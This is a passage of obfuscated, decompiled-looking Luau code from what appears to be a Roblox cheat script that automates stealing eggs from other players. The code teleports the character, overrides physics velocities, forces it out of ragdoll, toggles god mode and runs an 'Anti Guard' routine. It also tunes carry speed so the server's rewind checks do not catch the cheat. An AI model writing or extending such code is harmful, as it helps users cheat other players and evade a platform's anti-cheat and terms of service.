if state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown then
humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
end
end)
end
n25 += RunService.Heartbeat:Wait()
end
end)
end
local n25 = 0
while not safeCarry.SnapPickup and not safeCarry.GetUp and fn32() and n25 < 6 and not fn14(arg) do
str3 = "Line Drop: egg is down at the line, getting up"
n25 += RunService.Heartbeat:Wait()
end
local n26 = 0
while not fn14(arg) and n26 < 4 do
n26 += 1
local v23 = fn49(carryUid)
if not v23 then
fn57()
str3 = "Line Drop: the egg is gone"
return false
end
local v24 = fn59()
if v24 and v24.State == "Slot" then
fn57()
str3 = "Line Drop: the egg went back to its nest"
return false
end
str3 = "Line Drop: picking the egg up at the line"
local n27
if safeCarry.SnapPickup then
local v25 = tbl4.Root()
if v25 then
pcall(function()
v25.CFrame = CFrame.new(v23 + Vector3.new(0, 3, 0)) * CFrame.Angles(0, 1.5707963267948966, 0)
v25.AssemblyLinearVelocity = Vector3.zero
end)
end
n27 = 5
else
local backRunRatio = safeCarry.BackRunRatio
local backRunMax = safeCarry.BackRunMax
local n28 = math.clamp(tbl4.WalkSpeed() * backRunRatio, 1200, backRunMax)
local n29 = 0
local n30 = 0
while true do
if not steal.Carrying and n29 < 10 and not fn14(arg) then
local v25 = tbl4.Root()
if v25 then
local vector2 = Vector3.new(v23.X - v25.Position.X, 0, v23.Z - v25.Position.Z)
local magnitude2 = vector2.Magnitude
if not (magnitude2 <= 4) then
local n31 = magnitude2 > 30 and math.clamp(magnitude2 * 4, tbl4.WalkSpeed(), n28)
if not n31 then
local pickupRatio = safeCarry.PickupRatio
n31 = tbl4.WalkSpeed() * pickupRatio
end
local n32 = vector2.Unit * math.min(n31, magnitude2 / 0.05)
pcall(function()
v25.AssemblyLinearVelocity = Vector3.new(n32.X, v25.AssemblyLinearVelocity.Y, n32.Z)
end)
if magnitude2 > 30 then
str3 = string.format("Line Drop: running back to the egg, %d studs", math.floor(magnitude2 + 0.5))
end
if os.clock() - n30 >= 0.1 then
n30 = os.clock()
task.spawn(fn29, carryUid)
end
n29 += RunService.Heartbeat:Wait()
continue
end
end
end
break
end
local v25 = tbl4.Root()
if v25 then
pcall(function()
v25.AssemblyLinearVelocity = Vector3.new(0, v25.AssemblyLinearVelocity.Y, 0)
end)
end
n27 = 2.5
end
local n28 = 0
while not steal.Carrying and n28 < n27 and not fn14(arg) do
task.spawn(fn29, carryUid)
if safeCarry.SnapPickup then
local v25 = tbl4.Root()
if v25 and Vector3.new(v25.Position.X - v23.X, 0, v25.Position.Z - v23.Z).Magnitude > 6 then
pcall(function()
v25.CFrame = CFrame.new(v23 + Vector3.new(0, 3, 0)) * CFrame.Angles(0, 1.5707963267948966, 0)
end)
end
end
n28 += task.wait(0.1)
end
if steal.Carrying and not steal.WrongEgg(carryUid) then
break
end
end
if not steal.Carrying then
fn57()
str3 = "Line Drop: could not pick the egg up again"
return false
end
local v23 = tbl4.Root()
if v23 and v23.Position.X - x > safeCarry.FarFromLine then
fn57()
str3 = "Line Drop: egg ended up far from the line, carrying it home safely"
return tbl4.SafeCarry.Home(arg)
end
str3 = "Line Drop: stepping over the line"
fn58(function()
return safeCarry.LastDelivered >= now or not steal.Carrying
end)
local v24 = tbl4.Root()
if v24 then
pcall(function()
v24.AssemblyLinearVelocity = Vector3.new(0, v24.AssemblyLinearVelocity.Y, 0)
end)
end
local n27 = 0
while n27 < 2 and safeCarry.LastDelivered < now and steal.Carrying and not fn14(arg) do
n27 += RunService.Heartbeat:Wait()
end
fn57()
return safeCarry.LastDelivered >= now
end
tbl4.SafeCarry.Home = function(arg)
local safeCarry = tbl4.SafeCarry
local v20 = stealHome()
local v21 = tbl4.Root()
if not v20 or not v21 then
return false
end
fn23()
local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
local areas = world and world:FindFirstChild("Areas")
local separationLine = areas and areas:FindFirstChild("SeparationLine")
local n21 = (separationLine and separationLine:IsA("BasePart") and separationLine.Position.X or 552) - 7
local character = localPlayer.Character
local humanoid = character and character:FindFirstChildOfClass("Humanoid")
if humanoid then
humanoid.PlatformStand = false
end
local now = os.clock()
local n22 = 0
local function fn55()
local v22 = tbl4.Root()
if not v22 then
return
end
local v23, v24, v25, v26, v27 = safeCarry.Plan(tbl4.Steal.CarryAreaId, (Vector3.new(v22.Position.X, 0, v22.Position.Z) - Vector3.new(v20.X, 0, v20.Z)).Magnitude + math.max(0, safeCarry.Height) * 2, safeCarry.Mult)
local n23 = v23 * safeCarry.CarryScale
n22 = n23
safeCarry.PlanOk = v24
safeCarry.FloorSpeed = safeCarry.BeatGuard and math.min(v27 + math.max(safeCarry.GuardMargin, 1), v26) or 0
str3 = string.format("Carrying home at %d (carry %d, guard %d, max %d)%s", math.floor(n23 + 0.5), math.floor(v25 + 0.5), math.floor(v27 + 0.5), math.floor(v26 + 0.5), v24 and "" or ", guard is faster, going at your max safe speed")
end
local function fn56()
local n23 = math.max(0, safeCarry.Height)
local v22 = tbl4.Root()
local character2 = localPlayer.Character
if n23 <= 0.5 or not v22 or not character2 then
return
end
local n24 = v20.Y + n23
if n24 - 2 <= v22.Position.Y then
return
end
local rotation = v22.CFrame.Rotation
local n25 = CFrame.new(Vector3.new(v22.Position.X, n24, v22.Position.Z)) * rotation
pcall(function()
character2:PivotTo(n25)
v22.AssemblyLinearVelocity = Vector3.zero
v22.AssemblyAngularVelocity = Vector3.zero
end)
end
fn55()
local v22 = safeCarry.NewHuman(true)
local v23 = tbl4.Root()
local n23 = math.clamp((v23 and v23.Position.Z or v20.Z) + v22.Lane, -425, -300)
local now2 = os.clock()
if safeCarry.CarryReact > 0 then
local n24 = os.clock() + safeCarry.React(0, safeCarry.CarryReact)
while os.clock() < n24 and not fn14(arg) do
RunService.Heartbeat:Wait()
end
end
local n24 = 0
if safeCarry.CarryStyle ~= "Walk" then
fn56()
end
while not fn14(arg) do
local v24 = tbl4.Root()
if not v24 then
return false
end
if not tbl4.Steal.Carrying then
if now <= safeCarry.LastDelivered then
return true
end
task.wait(0.1)
if now <= safeCarry.LastDelivered then
return true
end
if now <= safeCarry.LastFailed then
str3 = "Delivery was rewound, too fast for your speed"
return false
end
if not safeCarry.PlanOk and tbl4.Steal.CarryUid then
safeCarry.Blocked[tbl4.Steal.CarryUid] = true
str3 = string.format("The guard caught you with %s, it is faster than your max safe speed, skipping this egg", tostring(safeCarry.Category))
return false
end
n24 += 1
if safeCarry.RecoverTries < n24 then
str3 = "The egg is gone"
return false
end
str3 = "Egg dropped, taking it back"
if not fn51(arg) then
str3 = "Could not take the egg back"
return false
end
local n25 = 0
while fn32() and n25 < 4 and not fn14(arg) do
n25 += RunService.Heartbeat:Wait()
end
local n26 = math.min(now, os.clock())
fn55()
if safeCarry.CarryStyle ~= "Walk" then
fn56()
end
v24 = tbl4.Root()
if not v24 then
return false
end
now = n26
end
local now3 = os.clock()
local n25 = math.max(now3 - now2, 0.0041666666666666666)
local flag3 = safeCarry.CarryStyle == "Walk"
local n26 = flag3 and 0 or math.max(0, safeCarry.Height)
local v25, v26 = v22.Step(n25, n26 <= 0.5 and humanoid or nil, humanoid and humanoid.FloorMaterial ~= Enum.Material.Air)
local n27 = math.clamp(n23 + v26, -425, -300)
local vector = v24.Position.X > n21 + 2 and Vector3.new(n21, v24.Position.Y, n27) or v20
local v27, v28 = safeCarry.Avoid(v24.Position, vector)
if not v28 then
v27 = vector
end
local vector2 = Vector3.new(v27.X - v24.Position.X, 0, v27.Z - v24.Position.Z)
if vector2.Magnitude < 2 and v27 == v20 then
break
end
local n28 = math.max(n22 * v25, safeCarry.FloorSpeed or 0)
if os.clock() < (safeCarry.SlowUntil or 0) then
n28 *= safeCarry.SlowFactor
end
if flag3 then
pcall(function()
if humanoid and vector2.Magnitude > 0.01 then
humanoid:MoveTo(v24.Position + vector2.Unit * math.min(vector2.Magnitude, 30))
end
end)
elseif n26 > 0.5 then
local n29 = math.clamp(safeCarry.ClimbShare, 0.1, 0.9)
local y = v20.Y
local n30 = math.max(0, v24.Position.X - n21)
local n31 = n26 * math.sqrt(1 - n29 * n29) / n29
local n32 = y + n26
if v27 == v20 or n30 <= n31 then
n32 = y + n26 * math.clamp((v27 == v20 and 0 or n30) / math.max(n31, 1), 0, 1)
end
local n33 = math.clamp((n32 - v24.Position.Y) / 0.12, -n28 * n29, n28 * n29)
local v29 = math.sqrt(math.max(n28 * n28 - n33 * n33, 0))
local vector3 = vector2.Magnitude > 0.01 and vector2.Unit * math.min(v29, vector2.Magnitude / 0.05) or Vector3.zero
pcall(function()
v24.AssemblyLinearVelocity = Vector3.new(vector3.X, n33, vector3.Z)
end)
else
local vector3 = vector2.Magnitude > 0.01 and vector2.Unit * math.min(n28, vector2.Magnitude / 0.05) or Vector3.zero
pcall(function()
v24.AssemblyLinearVelocity = Vector3.new(vector3.X, v24.AssemblyLinearVelocity.Y, vector3.Z)
if safeCarry.RunAnimate and humanoid and vector2.Magnitude > 0.01 then
humanoid:Move(vector2.Unit, false)
end
end)
end
RunService.Heartbeat:Wait()
now2 = now3
end
if humanoid then
pcall(function()
local v24 = tbl4.Root()
if safeCarry.CarryStyle == "Walk" and v24 then
humanoid:MoveTo(v24.Position)
end
humanoid:Move(Vector3.zero, false)
end)
end
local n25 = 0
while n25 < 2 and not fn14(arg) do
if safeCarry.LastDelivered >= now then
return true
end
if now <= safeCarry.LastFailed then
str3 = "Delivery was rewound, too fast for your speed"
return false
end
if not tbl4.Steal.Carrying then
break
end
n25 += RunService.Heartbeat:Wait()
end
if tbl4.Steal.Carrying then
task.wait(0.2)
local eggState = tbl.EggState
if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
pcall(eggState.DropFieldEgg, "PlayerRequest")
end
end
return safeCarry.LastDelivered >= now
end
local function fn55(arg)
local antiGuard = tbl4.AntiGuard
if antiGuard.Enabled and not tbl4.SafeCarry.LineDrop and not tbl4.BossPortalUp() then
local n21 = 0
while not antiGuard.Busy and n21 < 1 and not fn14(arg) do
str3 = "Waiting for Anti Guard to start"
n21 += RunService.Heartbeat:Wait()
end
local busy = antiGuard.Busy
local n22 = 0
while antiGuard.Busy and n22 < 30 and not fn14(arg) do
str3 = "Anti Guard is slipping past the guard"
n22 += RunService.Heartbeat:Wait()
end
if busy then
local n23 = 0
local n24 = 0
while true do
if n23 < 10 and not fn14(arg) then
local v20 = fn32()
local ok, result = pcall(tbl4.Steal.HeldByMe)
ok = ok and result == true
local flag3 = not v20
if not (flag3 and not ok) then
if flag3 and ok and not antiGuard.Busy then
n24 += RunService.Heartbeat:Wait()
if not (n24 >= 0.3) then
continue
end
else
str3 = v20 and "The guard hit you, waiting until you can move" or "Waiting for Anti Guard to finish"
n23 += RunService.Heartbeat:Wait()
n24 = 0
continue
end
end
end
break
end
local ok, result = pcall(tbl4.Steal.HeldByMe)
if ok and not result then
tbl4.Steal.Carrying = false
end
local safeCarry = tbl4.SafeCarry
local v20 = stealHome()
local n25 = v20 and safeCarry.Enabled and safeCarry.CarryStyle ~= "Walk" and safeCarry.Height > 0.5 and v20.Y + safeCarry.Height or nil
local n26 = 0
while n26 < 0.8 and tbl4.Steal.Carrying and not fn14(arg) do
str3 = n26 < 0.6 and "Anti Guard done, rising up" or "Anti Guard done, getting ready"
local v21 = tbl4.Root()
if v21 and n25 then
local n27 = n25 - v21.Position.Y
local n28 = n26 < 0.6 and math.clamp(n27 / math.max(0.6 - n26, 0.1), -120, 120) or math.clamp(n27 / 0.2, -30, 30)
pcall(function()
v21.AssemblyLinearVelocity = Vector3.new(0, n28, 0)
end)
end
n26 += RunService.Heartbeat:Wait()
end
local ok2, result2 = pcall(tbl4.Steal.HeldByMe)
if ok2 and not result2 then
tbl4.Steal.Carrying = false
else
tbl4.SafeCarry.SlowUntil = os.clock() + 2
end
end
end
local n21 = 0
while not tbl4.Steal.Carrying and n21 < n14 and not fn14(arg) do
str3 = "Checking the egg in hand"
n21 += RunService.Heartbeat:Wait()
end
if not tbl4.Steal.Carrying then
str3 = "The egg is gone, staying to look for it"
if not fn51(arg) then
str3 = "The egg is gone"
return false
end
end
if tbl4.SafeCarry.LineDrop then
return tbl4.SafeCarry.LineDropHome(arg)
end
if tbl4.SafeCarry.Enabled then
return tbl4.SafeCarry.Home(arg)
end
local v20 = stealHome()
local v21 = tbl4.Root()
if not v20 or not v21 then
return false
end
local n22 = math.max(v21.Position.Y, v20.Y) + n7
local function fn56()
if tbl34.Uid and tbl34.Freed and tbl4.Steal.Carrying then
return "priority"
end
return nil
end
local flag3 = true
local n23 = 0
while true do
local v22 = tbl4.Root()
if not v22 then
return false
else
str3 = "Flying home"
local position = v22.Position
local n24 = math.max(n22, position.Y)
local v23, v24 = fn36(Vector3.new(position.X + (v20.X - position.X) * 0.25, position.Y + (n24 - position.Y) * 0.7, position.Z + (v20.Z - position.Z) * 0.25), arg, flag3, nil, nil, fn56)
if v23 then
v23, v24 = fn36(Vector3.new(v20.X, n24, v20.Z), arg, flag3, nil, nil, fn56)
end
if v23 then
v23, v24 = fn36(v20, arg, flag3, nil, nil, fn56)
end
if v23 then
local character = localPlayer.Character
character = character and character:FindFirstChildOfClass("Humanoid")
if character then
character.PlatformStand = false
end
task.wait(0.2)
if not tbl4.Steal.Carrying then
str3 = "Arrived without the egg"
return false
end
local eggState = tbl.EggState
if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
pcall(eggState.DropFieldEgg, "PlayerRequest")
end
return true
end
if v24 == "priority" then
local uid2 = tbl34.Uid
local freed = tbl34.Freed
local v25 = tbl34
tbl34.Uid = nil
v25.Freed = nil
local v26 = tbl4.Root()
if not v26 or not uid2 or not freed then
return false
end
if (freed - v26.Position).Magnitude <= n8 * n20 then
str3 = "Best egg fell nearby, swapping eggs"
local eggState = tbl.EggState
if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
pcall(eggState.DropFieldEgg, "PlayerRequest")
end
local n25 = 0
while tbl4.Steal.Carrying and n25 < 1 do
n25 += RunService.Heartbeat:Wait()
end
if not fn51(arg, uid2) then
return false
end
else
str3 = "Best egg fell far away, riding a guard hit to it"
if not fn54(arg, uid2, freed) then
return false
end
end
local v27 = tbl4.Root()
n23 = 0
if v27 then
n22 = math.max(v27.Position.Y, v20.Y) + n7
end
continue
end
if v24 == "dropped" and n23 < huge then
n23 += 1
if not fn51(arg) then
return false
end
continue
end
break
end
end
return false
end
local function fn56(arg)
local n21 = tonumber(arg) or 0
local tbl35 = { "", "K", "M", "B", "T", "Qa", "Qi" }
local n22 = 1
while math.abs(n21) >= 1000 and n22 < #tbl35 do
n21 /= 1000
n22 += 1
end
return string.format(n22 == 1 and "%.0f%s" or "%.2f%s", n21, tbl35[n22])
end
local function fn57(arg)
if not arg then
return "None"
end
local format = string.format
local str4 = tostring(arg.Category)
local n21 = tonumber(arg.Scale) or 0
local v20 = tostring
local areaId = arg.AreaId
local v21 = format("%s  %.2fx  |  value %s  |  %s", str4, n21, fn56(arg.Value), v20(areaId))
if arg.State == "Dropped" then
v21 ..= "  |  dropped"
elseif arg.State == "Carried" then
v21 ..= "  |  carried by a player"
end
return v21
end
local flag3 = false
local n21 = 0.5
local n22 = 0.6
local n23 = 0
local n24 = 0
local function fn58()
local v20 = n9
tbl4.Steal.Active = true
tbl4.Steal.Carrying = tbl4.Steal.Carrying == true
if not tbl4.Steal.Carrying then
tbl4.Steal.CarryUid = nil
end
local v21 = fn20(false, true)
local v22 = nil
local v23 = nil
local lastSkip = nil
for _, v24 in ipairs(v21) do
if v24.State == "Carried" then
v23 = v23 or v24
elseif not tbl4.StockWaits(v24) then
local v25 = tbl4.SafeCarry.Unsafe(v24)
if v25 then
lastSkip = lastSkip or v25
else
v22 = v24
break
end
end
end
local tbl35 = { v22 }
uid = v22 and v22.Uid or nil
tbl4.Steal.Wanted = v22 ~= nil
str2 = fn57(v22)
if v23 then
str2 ..= "  |  watching " .. tostring(v23.Category)
end
if not v22 then
tbl4.Steal.Active = false
lastSkip = lastSkip or tbl4.SafeCarry.LastSkip
tbl4.SafeCarry.LastSkip = nil
str3 = v23 and "Best egg is carried, waiting for it" or lastSkip and "Skipped: " .. lastSkip or "No egg matches"
return false
end
if not tbl4.ClaimMovement("steal") then
tbl4.Steal.Active = false
str3 = tbl4.InMechArena() and "In the Mech arena, waiting to be back home" or "Waiting for Auto Place"
return false
end
if tbl4.InMechArena() then
str3 = "Leaving the Mech arena first"
if not (type(tbl4.MechLeave) == "function" and tbl4.MechLeave() or false) or v20 ~= n9 then
tbl4.Steal.Active = false
str3 = "Stuck in the Mech arena, waiting"
return false
end
end
if tbl4.Treadmill.Riding or tbl4.OnBelt() then
tbl4.ExitBelt()
end
flag3 = true
tbl4.HoldBelt()
local function fn59(arg)
str3 = arg
local v24 = fn52(v22, v20)
local v25 = nil
local flag4 = false
if v24 then
if fn30(v22.Uid, v20) then
flag4 = fn55(v20)
v25 = nil
else
v25 = str3
end
end
fn26()
tbl4.Steal.Active = false
tbl4.Steal.LastFinishedAt = os.clock()
str3 = flag4 and "Delivered" or v25 or v24 and "Run ended" or "That egg would not come free"
return true
end
local v24 = tbl4.Root()
local position = typeof(v22.CFrame) == "CFrame" and v22.CFrame.Position or nil
if v24 and position then
local flag4 = (position - v24.Position).Magnitude <= n17
local areaId = v22.AreaId
local flag5 = localPlayer:GetAttribute("AreaId") == areaId
if flag4 or flag5 then
return (fn59("Target is right here, taking it"))
end
end
if tbl4.SafeCarry.Enabled and tbl4.SafeCarry.Approach == "Run" then
local v25 = tbl4.SafeCarry.RunTo(v22, v20)
local flag4, v26
if v25 then
if fn30(v22.Uid, v20) then
flag4 = fn55(v20)
v26 = nil
else
v26 = str3
flag4 = false
end
else
tbl32[v22.Uid] = os.clock() + n10
v26 = nil
flag4 = false
end
fn26()
tbl4.Steal.Active = false
tbl4.Steal.LastFinishedAt = os.clock()
str3 = flag4 and "Delivered" or v26 or v25 and "Run ended" or "That egg would not come free"
return true
end
local v25 = fn20(true)
local str4 = "FirstAreaEgg_" .. tostring(localPlayer.UserId)
local tbl36 = {}
for _, v26 in ipairs(v25) do
if fn37(v26) or type(v26.Uid) == "string" and string.sub(v26.Uid, 1, #str4) == str4 then
table.insert(tbl36, v26)
end
end
if #tbl36 ~= 0 then
v25 = tbl36
end
local v26, v27 = fn34(v25)
if not v26 then
tbl4.Steal.Active = false
str3 = "No egg matches"
return false
end
if v26.Uid == v22.Uid then
return (fn59("Target is the closest egg, taking it"))
end
local v28, v29 = fn38(v26)
local v30
if v29 and v24 then
local v31, v32, v33 = ipairs(v25)
local huge3 = math.huge
v30 = v26
for _, v34 in v31, v32, v33 do
local position2 = typeof(v34.CFrame) == "CFrame" and v34.CFrame.Position or nil
if v34.Uid ~= v22.Uid and v34.AreaId == v26.AreaId and position2 then
local magnitude = (position2 - v24.Position).Magnitude
local n25
if (position2 - v29).Magnitude > n16 then
n25 = magnitude + n16
else
n25 = magnitude
end
if n25 < huge3 then
huge3 = n25
v30 = v34
end
end
end
else
v30 = v26
end
str3 = string.format("Sleeping guard egg %d studs away", math.floor(v27 + 0.5))
if not v30 then
tbl4.Steal.Active = false
str3 = "No egg matches"
return false
end
local v31, v32 = fn46(v30, v20, false, tbl35[1])
if not v31 then
tbl4.Steal.Active = false
return false
end
local uid2 = nil
local uid3 = v22.Uid
local n25 = 0
local v33
while true do
if v32 and not fn14(v20) then
str3 = "Holding for the guard hit"
if not fn39(v20, v32, function(arg)
if not uid2 and tbl34.Uid and tbl34.Freed then
uid2 = tbl34.Uid
arg.Destination = tbl34.Freed + Vector3.new(0, 3, 0)
local v34 = tbl34
tbl34.Uid = nil
v34.Freed = nil
str3 = "Best egg fell, jumping to it instead"
end
end) then
v33 = uid3
break
end
n25 += 1
if uid2 then
fn51(v20, uid2)
v33 = uid2
break
end
local v34 = tbl35[n25]
v31, v32 = fn46(v34, v20, true, tbl35[n25 + 1])
if not v31 then
v33 = uid3
break
end
if v34 and type(v34.Uid) == "string" then
uid3 = v34.Uid
end
continue
end
v33 = uid3
break
end
if not fn30(v33, v20) then
local v34 = str3
fn26()
tbl4.Steal.Active = false
tbl4.Steal.LastFinishedAt = os.clock()
str3 = v34
return true
end
local v34 = fn55(v20)
fn26()
tbl4.Steal.Active = false
tbl4.Steal.LastFinishedAt = os.clock()
str3 = v34 and "Delivered" or "Run ended"
return true
end
local eggState = tbl.EggState
if type(eggState) == "table" then
for _, v20 in ipairs({ "FieldRefreshed", "FieldShifted", "FieldGone", "SnapshotRefreshed" }) do
local v21 = eggState[v20]
if type(v21) == "table" and type(v21.Connect) == "function" then
local ok, result = pcall(v21.Connect, v21, function()
tbl3.Wake()
end)
if ok and result then
fn4(function()
pcall(function()
result:Disconnect()
end)
end)
end
end
end
end
tbl3.Add(function()
local flag4
if v16 then
flag4 = type(v16.Set) == "function"
end
if flag4 then
pcall(v16.Set, nil, str3)
end
local flag5 = nil
if v17 then
flag5 = type(v17.Set) == "function"
end
if flag5 then
pcall(v17.Set, nil, str2)
end
if not tbl4.Toggle(v15, false) then
return false
end
local v20, v21, v22 = fn15()
if v20 then
if v21 == "night" then
fn17()
end
tbl4.Movement.StealFirst = true
tbl4.Steal.Wanted = false
if flag2 then
n9 += 1
tbl4.Steal.Active = false
fn26()
tbl4.StopWalking()
end
local n25 = math.max(0, math.ceil(v20 - v22))
if v21 == "wall" then
str3 = string.format("Field wall up, %ds", n25)
else
str3 = string.format("Night, going again in %ds", n25)
end
return false
end
if v18 and n12 == math.huge then
n12 = os.clock() + n11
end
if flag2 then
return true
end
if fn18() then
str3 = "Night over, waiting for the field to reset"
tbl3.Wake()
return false
end
if type(tbl4.MechFirst) == "function" and tbl4.MechFirst() then
local flag6 = false
if n23 <= os.clock() then
n23 = os.clock() + n21
local ok, result = pcall(fn20, false, false)
if ok and type(result) == "table" then
for _, v23 in ipairs(result) do
if v23.State ~= "Carried" and v23.RiftOnly ~= true and not tbl4.StockWaits(v23) then
flag6 = true
break
end
end
end
end
if not flag6 then
tbl4.Steal.Wanted = false
str3 = "Mech boss goes first, stealing after it"
return false
end
tbl4.Steal.BossOverride = true
tbl4.Steal.Wanted = true
tbl4.Movement.StealFirst = true
str3 = "Filtered egg found, leaving the boss for it"
tbl3.Wake()
return false
end
local stealFirst = tbl4.Movement.StealFirst
local owner = tbl4.Movement.Owner
local flag6 = tbl4.Movement.PlaceWanted and not stealFirst
local flag7
if flag6 then
flag7 = flag6
else
flag7 = owner ~= nil and owner ~= "steal" and owner ~= "treadmill" and owner ~= "scramble"
end
if flag7 then
if n23 <= os.clock() then
n23 = os.clock() + n21
local ok, result = pcall(fn20, false, false)
local wanted = ok and type(result) == "table" and result[1] ~= nil and not tbl4.StockWaits(result[1])
tbl4.Steal.Wanted = wanted
if wanted then
tbl4.Movement.StealFirst = true
else
tbl4.Steal.BossOverride = false
end
end
if tbl4.Steal.Wanted then
str3 = "Egg found, waiting for " .. tostring(owner or "Auto Place") .. " to stop"
else
str3 = "Waiting for " .. tostring(owner or "Auto Place")
end
return true
end
if os.clock() < n24 then
return true
end
tbl4.Movement.StealFirst = false
flag2 = true
task.spawn(function()
local ok = pcall(fn58)
tbl4.Steal.BossOverride = false
if flag3 then
flag3 = false
tbl4.ReleaseBelt()
end
if not ok then
fn26()
tbl4.Steal.Active = false
end
local v23 = uid
uid = nil
local v24 = v23 and tbl28[v23]
if v24 and v24.Once then
tbl28[v23] = nil
end
local v25 = tbl34
local v26 = tbl34
tbl34.Uid = nil
v25.Freed = nil
v26.Token = nil
if str3 == "Delivered" and not tbl4.IsNight() then
tbl4.Movement.StealFirst = true
end
if not tbl4.Steal.Wanted then
n24 = os.clock() + n22
end
tbl4.ReleaseMovement("steal")
flag2 = false
tbl3.Wake()
end)
return true
end)
end
v15 = v5
fn13 = function()
tbl4.Steal.BossOverride = false
n9 += 1
table.clear(tbl32)
tbl4.Steal.Active = false
tbl4.Steal.Wanted = false
local v20 = tbl4.Toggle(v15, false)
tbl4.Shield("steal", v20)
if not v20 then
tbl4.Movement.StealFirst = false
table.clear(tbl28)
table.clear(tbl29)
table.clear(tbl30)
end
fn26()
tbl4.StopWalking()
tbl3.Wake()
end
do
local function fn40()
n9 += 1
tbl4.Steal.Active = false
fn26()
tbl4.StopWalking()
end
local function fn41()
if tbl4.Toggle(v15, false) then
return true
end
if v15 and type(v15.Set) == "function" then
pcall(v15.Set, v15, true)
end
return false
end
tbl4.CancelSteal = function(arg)
if type(arg) ~= "string" then
return
end
tbl28[arg] = nil
tbl29[arg] = nil
tbl30[arg] = true
if flag2 and uid == arg then
fn40()
end
tbl3.Wake()
end
tbl4.StealQueue = function()
local tbl33 = {}
for k in pairs(tbl28) do
table.insert(tbl33, k)
end
table.sort(tbl33, function(arg, arg2)
local at = tbl28[arg].At
local at2 = tbl28[arg2].At
if at ~= at2 then
return at < at2
end
return arg < arg2
end)
return tbl33
end
tbl4.PrioritizeSteal = function(arg)
if type(arg) ~= "string" or fn16() then
return
end
local n18 = 0
for _, v20 in pairs(tbl28) do
if v20.At < n18 then
n18 = v20.At
end
end
tbl28[arg] = { At = n18 - 1, Once = false }
tbl30[arg] = nil
tbl32[arg] = nil
if fn41() and flag2 and not tbl4.Steal.Carrying and uid ~= arg then
fn40()
end
tbl3.Wake()
end
tbl4.MoveInPlan = function(arg, arg2)
if type(arg) ~= "string" or arg2 ~= -1 and arg2 ~= 1 or fn16() then
return
end
local v20 = tbl4.StealPlan()
local v21 = table.find(v20, arg)
local n18 = v21 and v21 + arg2
if not n18 or n18 < 1 or n18 > #v20 then
return
end
table.remove(v20, v21)
table.insert(v20, n18, arg)
local n19 = math.max(v21, n18)
for i, v22 in ipairs(v20) do
if i <= n19 or tbl28[v22] then
local v23 = tbl28[v22]
if v23 then
v23.At = i
else
tbl28[v22] = { At = i, Once = false }
end
tbl30[v22] = nil
end
end
if flag2 and not tbl4.Steal.Carrying and uid and v20[1] ~= uid then
fn40()
end
tbl3.Wake()
end
tbl4.StealPlan = function()
if not tbl4.Toggle(v15, false) or tbl4.IsNight() then
return {}, nil
end
local tbl33 = {}
if uid then
table.insert(tbl33, uid)
end
local ok, result = pcall(fn20, false, true)
if ok and type(result) == "table" then
for _, v20 in ipairs(result) do
if v20.Uid ~= uid then
table.insert(tbl33, v20.Uid)
end
end
end
return tbl33, uid
end
tbl4.SetPriority = function(arg, arg2)
if arg2 then
tbl4.PrioritizeSteal(arg)
else
tbl4.CancelSteal(arg)
end
end
tbl4.ResortSteal = function()
if flag2 and not tbl4.Steal.Carrying and uid and not tbl28[uid] then
local ok, result = pcall(fn20, false, true)
if ok and type(result) == "table" then
local v20 = nil
for _, v21 in ipairs(result) do
if v21.State ~= "Carried" then
v20 = v21
break
else
v20 = nil
end
end
if not v20 or v20.Uid ~= uid then
fn40()
end
end
end
tbl3.Wake()
end
tbl4.StealNow = function(arg, arg2)
if type(arg) ~= "string" or fn16() then
return
end
if not tbl28[arg] then
local n18 = 0
for _, v20 in pairs(tbl28) do
if n18 < v20.At then
n18 = v20.At
end
end
tbl28[arg] = { At = n18 + 1, Once = arg2 == true }
end
tbl30[arg] = nil
tbl32[arg] = nil
local flag3 = fn41() and flag2 and not tbl4.Steal.Carrying and uid ~= arg
local flag4
if flag3 then
flag4 = not (uid and tbl28[uid])
else
flag4 = flag3
end
if flag4 then
fn40()
end
tbl3.Wake()
end
end
fn4(function()
tbl4.GodMode(false)
tbl4.ReleaseMovement("steal")
fn26()
end)
tbl4.UiQueue = {}
tbl4.UiDefer = function(arg)
table.insert(tbl4.UiQueue, arg)
end
tbl4.Notify = function(arg, arg2)
if type(v) == "table" and type(v.Notify) == "function" then
pcall(v.Notify, arg, arg2, 5)
end
end
local connection = RunService.Heartbeat:Connect(function()
local uiQueue = tbl4.UiQueue
if #uiQueue == 0 then
return
end
tbl4.UiQueue = {}
for _, v20 in ipairs(uiQueue) do
pcall(v20)
end
end)
fn4(function()
pcall(function()
connection:Disconnect()
end)
end)
tbl4.Rift = { Requirements = {}, At = 0, Busy = false, Next = 0, Handles = {}, Restart = {} }
tbl4.RiftOn = function(arg)
local v20 = tbl4.Rift.Handles[arg]
return v20 ~= nil and tbl4.Toggle(v20, false) == true
end
do
local n18 = 8
local function fn40(arg)
local directory = tbl.Assets and tbl.Assets.Directory
local flag3 = type(directory) == "table" and directory[tostring(arg)] or nil
return type(flag3) == "table" and flag3 or nil
end
tbl4.EggRarity = function(arg)
local v20 = fn40(arg.AssetCategory)
local rarity = v20 and v20.Rarity or nil
local flag3 = type(rarity) == "table"
if flag3 then
flag3 = tonumber(rarity.RarityNumber or rarity.Rank)
end
return flag3 or 0
end
tbl4.EggIncome = function(arg)
local n19 = fn40(arg.AssetCategory)
n19 = n19 and tonumber(n19.EarningRate) or 0
local n20 = tonumber(arg.AssetScale) or 0
if n20 <= 0 then
return 0
end
local n21 = n20 > 5 and (n20 / 5) ^ 1.2 * 19.637875755794113 or n20 ^ 1.85
local mutations = tbl.Mutations
local flag3 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
local n22 = 1
if flag3 then
local ok
ok, n22 = pcall(mutations.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})
ok = ok and type(n22) == "number"
local n23 = 1
if not ok then
n22 = n23
end
end
return n19 * n21 * n22
end
tbl4.RiftShortfall = function()
local tbl33 = {}
for _, requirement in ipairs(tbl4.Rift.Requirements) do
tbl33[requirement] = (tbl33[requirement] or 0) + 1
end
if next(tbl33) == nil then
return tbl33
end
local save2 = tbl.Save
local flag3 = type(save2) == "table" and type(save2.Get) == "function"
local result = nil
if flag3 then
local ok
